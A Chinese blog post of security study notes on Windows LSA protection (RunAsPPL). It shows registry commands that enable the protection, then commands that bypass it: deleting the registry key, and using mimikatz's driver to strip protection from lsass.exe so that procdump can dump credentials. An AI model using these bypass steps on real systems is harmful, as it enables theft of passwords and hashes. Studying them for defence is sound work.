> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0QqJwNLsy803_cfpeF9cBg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4oWL3SYllKKrXO1e9BgSTNTJo3OnWS9u8XXK17HoUaEIhnkLVFV5eqw/640?wx_fmt=jpeg)

一位苦于信息安全的萌新小白帽  

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

继续补补笔记  

LSA 保护

微软在 Windows 8.1、Windows Server 2012 R2 添加了 **LSA 保护策略**  

```
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)
```

以防止不受保护的进程对 lsass.exe 读取内存和代码注入。  

这样一搞我们就不是用 mimikatz 对 lsass.exe 进行注入，获取密码等操作也会失败。

开启 LAS 保护

微软官方说了，进行以下操作就可以启用 LSA 保护  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4OYP4iaQkxC0vdUCSdo4u5hMYLiaDzs9y5w5Yz9opCCaZ3gxtedYwB2icg/640?wx_fmt=png)

我们先看看主机有没有开启 LSA 进程保护  

```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4IvTA6lLgicrfhKjmSoV36hCjnkjQuibfuXmbccyx4eAwibiaOTXiar5g6Qw/640?wx_fmt=png)  

添加 RunAsPPL 键值为 1，重启后就开启了 LSA 保护  

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 1 /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4DFzibf6nIlQwDNaialPgpSOc7GwE1fslvNPzPQfNuzDjktp5jpEKgJHw/640?wx_fmt=png)  

这时即使我们获取了 debug 权限，也不能获取明文密码和 hash 了  

此时使用 mimikatz，进行注入 lsass 进程是失败的

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4VXicKMER7ISdx22HVJmqdpUh55Br924Ienu0eJkC0skibV4zQ1USbYOw/640?wx_fmt=png)

尝试经常用的 procdump 把 lsass 进程给弄下来  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4w7w50CW8clzhYwag2C7icUxoH9VUFK4c5NP2HxepLvaEEscYO7O0KibQ/640?wx_fmt=png)

发现不行了? 这可咋整  

接下来该咋办？

第一种方式就是将上面提到的注册表 RunAsPPL 键值对给删了  

```
reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /f
```

但是想让配置生效需要重启主机，现实情景下你咋重启，这不暴露了吗？  

还一种方式那就是 mimikatz ，早早 mimikatz 就已经支持了 LSA 保护绕过

它自带一个 mimidrv.sys 文件，这文件具体干嘛的我也不知道，第一次用

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4h9xXlneVPzSTTeQ5HYkn0NJBPgJpaxlLoObzbqKicgiaoqTQjmgDsajw/640?wx_fmt=png)

登上 mimikatz，获取 debug 权限  

将 mimidrv.sys 驱动加载进去，使用该驱动绕过 lsa 保护

```
privilege::debug
!+
!processprotect /process:lsass.exe /remove
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF44ktw8sb3mm6k862x0CicpLtShyjSn2WnpP5RH4RNkrhf9NuHHsRPp8Q/640?wx_fmt=png)  

这时再尝试发现绕过了 lsa 保护，可以正常注入 ssp 和读取密码了  

再尝试 procdump 转储 lsass 进程

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNwkNia0umDaeiaPDvgvHhAF4xVsFQWPjjD1HVlN80gQfLasSkFyc3O5K0icohu2IfMfrImToDRGwR9w/640?wx_fmt=png)

成功